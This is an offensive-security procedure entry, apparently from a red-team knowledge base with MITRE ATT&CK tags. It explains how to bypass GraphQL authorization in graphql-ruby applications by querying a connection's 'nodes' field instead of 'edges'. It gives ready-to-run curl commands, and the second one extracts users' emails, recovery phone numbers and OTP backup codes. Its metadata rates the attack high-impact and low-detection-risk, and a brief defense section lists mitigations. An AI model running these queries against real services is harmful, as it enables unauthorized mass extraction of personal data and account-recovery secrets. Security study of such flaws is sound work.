---
id: proc-uuid-001
tags:
  - graphql
  - authorization-bypass
  - information-disclosure
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-secure-users-edges-query]]'
  - '[[commands/graphql-vulnerable-users-nodes-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:26:00.512Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Bypass-GraphQL-Authorization-Using-Nodes-Field-on-Users

## Summary

This procedure exploits a flaw in GraphQL connection types where the 'nodes' field returns unscrubbed ActiveRecord objects, bypassing attribute-level authorization applied to the 'edges' field, enabling unauthorized access to sensitive user PII such as emails, phone numbers, and OTP backup codes.

## Description

In GraphQL APIs built with graphql-ruby, connection types like users() provide both 'edges' (with cursor and node wrappers that enforce authorization) and 'nodes' (direct array access). A migration to class-based implementations can introduce the 'nodes' field without proper scrubbing, allowing authenticated users to query raw data. This targets web applications with Ruby/ActiveRecord backends, assuming basic authentication. Outcomes include disclosure of confidential user data across the database, limited by schema visibility but exposing high-value PII. Prerequisites include a valid session and knowledge of the schema.

## Requirements

1. Authenticated HTTP access to the GraphQL endpoint (e.g., valid session cookie)
2. HTTP client like curl for sending POST requests
3. Basic understanding of GraphQL queries and the target schema (e.g., users() connection)

## Defense

Defensive measures and detection strategies:

- Implement uniform authorization on all connection fields, including 'nodes', using graphql-ruby's field-level resolvers
- Enable GraphQL introspection limits and query complexity analysis to detect anomalous queries
- Monitor API logs for queries targeting 'nodes' fields or sensitive attributes; use WAF rules to block unscrubbed data access
- Scrub sensitive fields at the database level via ActiveRecord scopes

## Objectives

1. Bypass attribute-level authorization to access raw user objects
2. Extract PII from multiple users without permission checks
3. Validate the bypass by comparing scrubbed vs. unscrubbed responses

## Instructions

### Step 1: Send Secure Edges Query for Baseline

**Context**: Establish a baseline by querying via the authorized 'edges' path, which applies scrubbing and should return limited or no sensitive data.

**Command** ([[commands/graphql-secure-users-edges-query]]):
```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { users() { edges { node { email } } } }"}'
```

> This command sends a POST request to the GraphQL endpoint with a query using 'edges'. Expected output: JSON with scrubbed or empty 'email' fields, confirming authorization is enforced on this path.

### Step 2: Exploit Nodes Field for Unscrubbed Access

**Context**: Switch to the 'nodes' field to bypass scrubbing and retrieve raw sensitive attributes like email, phone numbers, and OTP codes.

**Command** ([[commands/graphql-vulnerable-users-nodes-query]]):
```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { users() { nodes { email account_recovery_phone_number otp_backup_codes } } }"}'
```

> This command targets 'nodes' directly, returning ActiveRecord relations without authorization. Expected output: Full JSON array of users with unscrubbed PII, such as complete emails and hashed OTP codes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-secure-users-edges-query]]
- [[commands/graphql-vulnerable-users-nodes-query]]

## Tools Used


## Tags

- [[graphql]]
- [[authorization-bypass]]
- [[information-disclosure]]
